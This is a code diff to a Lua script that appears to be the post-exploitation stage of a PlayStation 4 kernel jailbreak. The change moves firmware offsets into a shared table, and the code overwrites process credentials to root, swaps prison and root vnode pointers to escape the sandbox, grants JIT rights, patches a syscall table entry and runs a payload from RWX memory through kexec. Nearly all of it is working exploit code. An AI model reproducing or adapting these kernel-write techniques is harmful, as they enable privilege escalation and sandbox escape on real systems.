@@ -73,6 +73,8 @@ syscall.resolve({
     aio_multi_poll = 0x298,
     aio_multi_cancel = 0x29a,
     aio_submit_cmd = 0x29d,
+    
+    kexec = 0x295,
 })
 
 
@@ -1634,14 +1636,9 @@ end
 
 function post_exploitation_ps4()
 
-    local evf_ptr = kernel.addr.inside_kdata
-    local evf_string = kernel.read_null_terminated_string(evf_ptr)
-    printf("evf string @ %s = %s", hex(evf_ptr), evf_string)
-
-    -- Get current firmware version
-    local fw = tonumber(FW_VERSION:match("%d+%.%d+"))
-    if not offsets[fw] then
-        printf("Unsupported firmware: %s", FW_VERSION)
+    -- if we havent found evf string offset, assume we havent found every kernel offsets yet for this fw
+    if not kernel_offset.EVF_OFFSET then
+        printf("fw not yet supported for jailbreaking")
         return
     end
     
@@ -1652,7 +1649,7 @@ function post_exploitation_ps4()
     -- Calculate KBASE from EVF using table offsets
     -- credit: @egycnq
     local function calculate_kbase(leaked_evf_ptr)
-        local evf_offset = offsets[fw].evf_offset
+        local evf_offset = kernel_offset.EVF_OFFSET
         return leaked_evf_ptr - evf_offset
     end
     
@@ -1681,9 +1678,9 @@ function post_exploitation_ps4()
     -- credit: @egycnq
     local function find_kbase(leaked_ptr, max_scan)
         local ELF0, ELF1, ELF2, ELF3 = 0x7F, 0x45, 0x4C, 0x46
-        local static_offset = offsets[fw].evf_offset
+        local static_offset = kernel_offset.EVF_OFFSET
         local static_kbase = leaked_ptr - static_offset
-        local target_id_offset = offsets[fw].target_id_offset
+        local target_id_offset = kernel_offset.TARGET_ID_OFFSET
     
         printf("Static KBASE guess based on EVF offset (0x%X): %s", static_offset, hex(static_kbase))
     
@@ -1727,35 +1724,43 @@ function post_exploitation_ps4()
     -- Sandbox escape
     -- credit: @egycnq
     local function escape_sandbox(kbase, curproc)
-        local PRISON0   = kbase + offsets[fw].PRISON0
-        local ROOTVNODE = kbase + offsets[fw].ROOTVNODE
+        local PRISON0   = kbase + kernel_offset.PRISON0
+        local ROOTVNODE = kbase + kernel_offset.ROOTVNODE
     
-        local offset_p_fd    = 0x48
-        local offset_p_ucred = 0x40
-        local offset_fd_rdir = 0x10
-        local offset_fd_jdir = 0x18
+        local OFFSET_P_UCRED = 0x40
     
-        local p_fd    = kernel.read_qword(curproc + offset_p_fd)
-        local p_ucred = kernel.read_qword(curproc + offset_p_ucred)
+        local proc_fd = kernel.read_qword(curproc + kernel_offset.PROC_FD)
+        local ucred = kernel.read_qword(curproc + OFFSET_P_UCRED)
     
-        kernel.write_dword(p_ucred + 0x4, 0)
-        kernel.write_dword(p_ucred + 0x8, 0)
-        kernel.write_dword(p_ucred + 0xC, 0)
-        kernel.write_dword(p_ucred + 0x10, 0)
+        -- kernel.write_dword(p_ucred + 0x4, 0)
+        -- kernel.write_dword(p_ucred + 0x8, 0)
+        -- kernel.write_dword(p_ucred + 0xC, 0)
+        -- kernel.write_dword(p_ucred + 0x10, 0)
+        
+        kernel.write_dword(ucred + 0x04, 0) -- cr_uid
+        kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
+        kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
+        kernel.write_dword(ucred + 0x10, 0) -- cr_ngroups
+        -- kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
+        -- kernel.write_dword(ucred + 0x14, 0) -- cr_rgid
     
         local prison0 = kernel.read_qword(PRISON0)
-        kernel.write_qword(p_ucred + 0x30, prison0)
+        kernel.write_qword(ucred + 0x30, prison0)
+
+        -- add JIT privileges 
+        kernel.write_qword(ucred + 0x60, -1)
+        kernel.write_qword(ucred + 0x68, -1)
     
         local rootvnode = kernel.read_qword(ROOTVNODE)
-        kernel.write_qword(p_fd + offset_fd_rdir, rootvnode)
-        kernel.write_qword(p_fd + offset_fd_jdir, rootvnode)
+        kernel.write_qword(proc_fd + 0x10, rootvnode) -- fd_rdir
+        kernel.write_qword(proc_fd + 0x18, rootvnode) -- fd_jdir
     
         print("Sandbox escape complete ... root FS access and jail broken")
     end
 
-    function apply_kernel_kpatches_ps4(kbase)
-        kernel.write_qword(p_ucred + 0x60, -1)
-        kernel.write_qword(p_ucred + 0x68, -1)
+    function apply_patches_to_kernel_data_ps4(kbase)
+        local mtttg_addr = uint64(0x920100000)
+        local shadow_mapping_addr = uint64(0x926100000)
         
         local sysent_661_addr = kbase + 0x1107f00
         local sy_narg = kernel.read_dword(sysent_661_addr):tonumber()
@@ -1787,16 +1792,15 @@ function post_exploitation_ps4()
         local write_handle = syscall.jitshm_alias(exec_handle, 0x3)
 
         -- map shadow mapping and write into it
-        syscall.mmap(uint64(0x920100000), aligned_memsz, PROT_RW, 0x11, write_handle, 0)
-        memory.memcpy(uint64(0x920100000), bin_data_addr:tonumber(), 225)
+        syscall.mmap(shadow_mapping_addr, aligned_memsz, PROT_RW, 0x11, write_handle, 0)
+        memory.memcpy(shadow_mapping_addr, bin_data_addr:tonumber(), 225)
 
         -- map executable segment
-        syscall.mmap(uint64(0x926100000), aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
-        printf("First bytes: 0x%x", memory.read_dword(uint64(0x926100000)):tonumber())
+        syscall.mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
+        printf("First bytes: 0x%x", memory.read_dword(mapping_addr):tonumber())
         
         -- execute payload
-        -- native.fcall(uint64(0x926100000))
-        syscall.kexec(uint64(0x926100000))
+        syscall.kexec(mapping_addr)
         
         print("After kexec")
         
@@ -1811,7 +1815,7 @@ function post_exploitation_ps4()
     printf("Kernel Base Candidate: %s", hex(kbase))
     verify_elf_header(kbase)
     escape_sandbox(kbase, proc)
-    apply_kernel_kpatches_ps4(kbase)
+    apply_patches_to_kernel_data_ps4(kbase)
 end
 
 
